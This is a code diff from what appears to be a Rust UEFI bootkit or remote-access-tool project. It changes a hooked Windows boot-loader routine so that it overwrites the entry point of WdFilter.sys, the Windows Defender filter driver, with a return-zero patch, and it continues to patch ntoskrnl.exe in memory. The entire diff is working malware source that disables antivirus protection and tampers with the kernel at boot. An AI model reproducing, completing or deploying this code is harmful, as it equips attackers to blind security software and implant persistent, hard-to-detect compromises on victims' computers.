@@ -8,7 +8,7 @@ use core::sync::atomic::{AtomicI64, AtomicPtr, Ordering};
 use core::{mem, ptr, slice};
 
 use log::{debug, error, info, warn};
-use rat_common::windows::utils::insert_jmp_trampoline;
+use rat_common::windows::utils::{insert_jmp_trampoline, return_zero_patch};
 use uefi::Status;
 use windows_sys::w;
 
@@ -165,10 +165,30 @@ unsafe extern "efiapi" fn _osl_fwp_kernel_setup_phase1_hooked(
     }
 
     let load_order_list_head = unsafe { &(*loader_block).LoadOrderListHead };
-    let ntoskrnl_node =
-        unsafe { utils::get_boot_loaded_module(load_order_list_head, w!("ntoskrnl.exe")) };
 
-    if let Some(ntoskrnl_entry) = ntoskrnl_node {
+    if let Some(wdfilter_entry) =
+        unsafe { utils::get_boot_loaded_module(load_order_list_head, w!("WdFilter.sys")) }
+    {
+        let patched = return_zero_patch();
+        unsafe {
+            ptr::copy_nonoverlapping(
+                patched.as_ptr(),
+                wdfilter_entry.kldr_entry.EntryPoint as *mut u8,
+                patched.len(),
+            );
+        }
+
+        info!(
+            "Patched WdFilter.sys entrypoint at {:p}",
+            wdfilter_entry.kldr_entry.EntryPoint,
+        );
+    } else {
+        warn!("Cannot find base address of WdFilter.sys");
+    }
+
+    if let Some(ntoskrnl_entry) =
+        unsafe { utils::get_boot_loaded_module(load_order_list_head, w!("ntoskrnl.exe")) }
+    {
         let ntoskrnl = unsafe {
             slice::from_raw_parts_mut(
                 ntoskrnl_entry.kldr_entry.DllBase as *mut u8,
@@ -186,7 +206,7 @@ unsafe extern "efiapi" fn _osl_fwp_kernel_setup_phase1_hooked(
 
         patch_ntoskrnl(ntoskrnl, buffer, load_order_list_head);
     } else {
-        warn!("Cannot find base DLL address of ntoskrnl.exe");
+        warn!("Cannot find base address of ntoskrnl.exe");
     }
 
     drop(cr0);
